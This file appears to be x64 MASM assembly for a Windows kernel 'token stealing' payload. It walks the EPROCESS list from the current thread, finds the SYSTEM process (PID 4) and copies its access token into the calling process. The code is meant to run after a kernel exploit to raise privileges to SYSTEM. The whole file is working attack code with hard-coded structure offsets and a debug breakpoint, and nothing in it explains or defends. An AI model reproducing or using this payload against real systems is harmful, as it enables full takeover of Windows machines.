.code

TokenStealingPayload PROC
	int 3
	mov r9, qword ptr gs:[188h]
	mov r9, qword ptr [r9 + 220h]
	mov r8, qword ptr [r9 + 3e8h]
	mov rax, r9
	loop1:
	mov rax, qword ptr [rax + 2f0h]
	sub rax, 2f0h
	cmp qword ptr [rax + 2e8h], r8
	jne loop1
	mov rcx, rax
	add rcx, 358h
	mov rax, r9
	loop2:
	mov rax, qword ptr [rax + 2f0h]
	sub rax, 2f0h
	cmp qword ptr [rax + 2e8h], 4
	jne loop2
	mov rdx, rax
	add rdx, 358h
	mov rdx, qword ptr [rdx]
	mov qword ptr [rcx], rdx 
	ret
TokenStealingPayload ENDP

END